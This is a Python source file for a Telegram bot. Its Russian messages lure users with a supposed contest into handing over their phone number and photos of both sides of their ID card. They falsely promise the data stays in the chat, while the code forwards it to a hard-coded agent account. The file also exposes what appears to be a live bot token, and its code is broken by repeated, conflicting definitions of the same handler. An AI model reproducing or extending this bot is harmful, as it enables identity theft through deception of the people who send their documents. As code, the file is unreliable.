from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters
)
TOKEN = "8821700304:AAFoceH8PowHtn0wmVkP7UdF7eG5Pa4uCaM"
app = Application.builder().token(TOKEN).build()
async def start(update, context):
    await update.message.reply_text(
        "Здравствуйте! Это бот, помогающий нам отвечать клиентам и никого не терять."
        )
    
    await update.message.reply_text(
        "Для участия в конкурсе вам необходимо предоставить свой номер телефона, а также фото или скан ID-карты с двух сторон. Ваша личная информация будет надежно храниться только в этом чате. Нам нужна информация о вас, чтобы суметь предоставить вам все услуги и ответы максимально быстро."
    )
    from telegram import ReplyKeyboardMarkup, KeyboardButton

    button = KeyboardButton(
    text="Отправить номер",
    request_contact=True
)

keyboard = ReplyKeyboardMarkup([[button]])

async def start(update, context):
    await update.message.reply_text(
    "Нажмите кнопку ниже",
    reply_markup=keyboard
)
async def contact_handler(update, context):
    phone = update.message.contact.phone_number

    context.user_data["phone"] = phone

    await update.message.reply_text(
        "Теперь отправьте фото ID-карты."
    )

async def photo_handler(update, context):
    photo = update.message.photo[-1]

    phone = context.user_data.get("phone")

AGENT_ID = 378758973

async def start(update, context):
    await context.bot.send_message(
    AGENT_ID,
    f"Новый клиент\nТелефон: {phone}"
)

    await context.bot.forward_message(
    AGENT_ID,
    update.message.chat_id,
    update.message.message_id
)
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
app.add_handler(MessageHandler(filters.PHOTO, photo_handler))

app.run_polling()
